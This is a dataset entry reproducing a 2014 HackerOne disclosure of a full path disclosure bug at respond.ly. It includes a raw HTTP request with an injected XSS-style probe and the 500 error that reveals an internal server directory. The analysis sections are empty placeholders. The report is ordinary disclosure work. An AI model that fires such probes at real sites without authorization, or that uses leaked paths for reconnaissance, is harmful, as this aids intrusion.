---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '9137'
original_report_id: '9137'
title: Full Path Disclosure
weakness: Information Disclosure
team_handle: respondly
created_at: '2014-04-22T16:39:17.185Z'
disclosed_at: '2014-04-23T04:46:30.096Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure

## Metadata

- HackerOne Report ID: 9137
- Weakness: Information Disclosure
- Program: respondly
- Disclosed At: 2014-04-23T04:46:30.096Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

{"code":500,"error":"Failed to render CSS stylesheet.","file":"/assets/packages/app/shared/css/","message":"ENOENT, open '/srv/www/respondly/releases/20140421220734/marketing_bundle/programs/server/assets/packages/app/shared/css/"}

Request
------------
GET /css/shared/%22ns=%22alert(9) HTTP/1.1
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;)
Accept-Language: en-us,en;q=0.5
Host: respond.ly
Accept-Encoding: gzip, deflate

Response
--------------
HTTP/1.1 500 Internal Server Error
Connection: keep-alive
Date: Tue, 22 Apr 2014 16:36:00 GMT
Transfer-Encoding: chunked
Server: nginx
Vary: Accept-Encoding
X-Frame-Options: DENY
Content-Type: application/json

{"code":500,"error":"Failed to render CSS stylesheet.","file":"/assets/packages/app/shared/css/","message":"ENOENT, open '/srv/www/respondly/releases/20140421220734/marketing_bundle/programs/server/assets/packages/app/shared/css/"}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
